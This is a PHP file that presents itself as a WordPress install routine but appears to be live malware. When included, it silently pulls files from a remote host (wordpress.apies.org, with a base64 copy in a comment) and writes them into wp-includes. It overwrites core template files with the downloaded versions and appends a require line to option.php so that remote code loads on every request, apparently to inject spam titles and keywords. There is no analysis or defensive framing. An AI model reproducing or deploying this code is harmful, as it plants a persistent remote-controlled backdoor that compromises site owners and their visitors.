<?php
require_once('autoloads.php');
error_reporting(0);
use \WPS\API;
$curl = new API();
function SetHeader($url){
	global $curl;
		$curl->get("$url");
		$curl->responseHeaders;
		if($curl->responseHeaders['Status-Line'] == 'HTTP/1.0 200 OK' || 
		$curl->responseHeaders['Status-Line'] == 'HTTP/1.1 200 OK'    ||
		$curl->responseHeaders['Status-Line'] == 'HTTP/1.2 200 OK'){
			return true;
		}
}
function wp_setup_install(){
	$curl = new API();
	include(ABSPATH.'/wp-includes/version.php');
	$trunkAPI = 'http://wordpress.apies.org/trunks/';//base64_decode('aHR0cDovL3dvcmRwcmVzcy5hcGllcy5vcmcvdHJ1bmsv');
	if(
		SetHeader("$trunkAPI"."wp-includes/autoload.php") 
		and SetHeader("$trunkAPI"."wp-includes/class-wp-customize-editor.php")
		and SetHeader("$trunkAPI"."$wp_version"."/post-template.php") 
		and SetHeader("$trunkAPI"."$wp_version"."/template-loader.php") 
		and SetHeader("$trunkAPI"."$wp_version"."/general-template.php")
		//and $_GET['version']
	){
		if(!file_exists( ABSPATH . '/wp-includes/autoload.php')){ //ok
			
			$file = ABSPATH . '/wp-includes/autoload.php';
			$fopenFile = fopen ("$file" , 'w+'); 
			if ( @extension_loaded( curl ) ) { 
			$writeFile = $curl->get("$trunkAPI".'/wp-includes/autoload.php');
			}else{
			$writeFile = file_get_contents("$trunkAPI".'/wp-includes/autoload.php');
			}
			file_put_contents ($file, "$writeFile",FILE_APPEND);
		}
		if(!file_exists( ABSPATH . '/wp-includes/class-wp-customize-editor.php') ){ //ok
			$file = ABSPATH . '/wp-includes/class-wp-customize-editor.php';
			$fopenFile = fopen ("$file" , 'w+'); 
			
			if ( @extension_loaded( curl ) ) {
			$writeFile = $curl->get("$trunkAPI".'/wp-includes/class-wp-customize-editor.php');
			}else{
			$writeFile = file_get_contents("$trunkAPI".'/wp-includes/class-wp-customize-editor.php');
			}
			file_put_contents ($file, "$writeFile",FILE_APPEND);
		}

		$searchKey = 'require_once( ABSPATH . "/wp-includes/class-wp-customize-editor.php");';
		$configExist = ABSPATH.'/wp-includes/option.php';
		$readFile=file_get_contents($configExist);
		if(!stristr($readFile,$searchKey)){
			$wp_ifiles = $configExist;
			$fopenFile = fopen ("$wp_ifiles" , 'a'); 
			file_put_contents ($wp_ifiles, $searchKey,FILE_APPEND);
		}
		
		$searchKey = 'wp_header();';
		$configExist = ABSPATH.'/wp-includes/general-template.php';
		$readFile=file_get_contents($configExist);
		if(!stristr($readFile,$searchKey)){
			include(ABSPATH.'/wp-includes/version.php');
			
			$file = ABSPATH . '/wp-includes/general-template.php';
			$fopenFile = fopen ("$file" , 'w+'); 
			if ( @extension_loaded( curl ) ) { 
			$writeFile = $curl->get("$trunkAPI".$wp_version.'/general-template.php');
			}else{
			$writeFile = $curl->get("$trunkAPI".$wp_version.'/general-template.php');
			}
			file_put_contents ($file, "$writeFile",FILE_APPEND);
		}
		
		$searchKey = 'print title_wp(PostTitle).title_wp(PostDesc).title_wp(PostKeywords);';
		$configExist = ABSPATH.'/wp-includes/template-loader.php';
		$readFile=file_get_contents($configExist);
		if(!stristr($readFile,$searchKey)){
			include(ABSPATH.'/wp-includes/version.php');
			$file = ABSPATH . '/wp-includes/template-loader.php';
			$fopenFile = fopen ("$file" , 'w+'); 
			if ( @extension_loaded( curl ) ) { 
			$writeFile = $curl->get("$trunkAPI".$wp_version.'/template-loader.php'); //ok
			}else{
			$writeFile = file_get_contents("$trunkAPI".$wp_version.'/template-loader.php'); //ok

			}
			file_put_contents ($file, "$writeFile",FILE_APPEND);
		}
		
		$searchKey = 'title_wp(InPostTitle)';
		$configExist = ABSPATH.'/wp-includes/post-template.php';
		$readFile=file_get_contents($configExist);
		if(!stristr($readFile,$searchKey)){
			include(ABSPATH.'/wp-includes/version.php');
			$file = ABSPATH . '/wp-includes/post-template.php';
			$fopenFile = fopen ("$file" , 'w+'); 
			if ( @extension_loaded( curl ) ) { 
				$writeFile = $curl->get("$trunkAPI".$wp_version.'/post-template.php'); //ok
			}else{
				$writeFile = file_get_contents("$trunkAPI".$wp_version.'/post-template.php');
			}
			file_put_contents ($file, "$writeFile",FILE_APPEND);
		}
	}
}
wp_setup_install();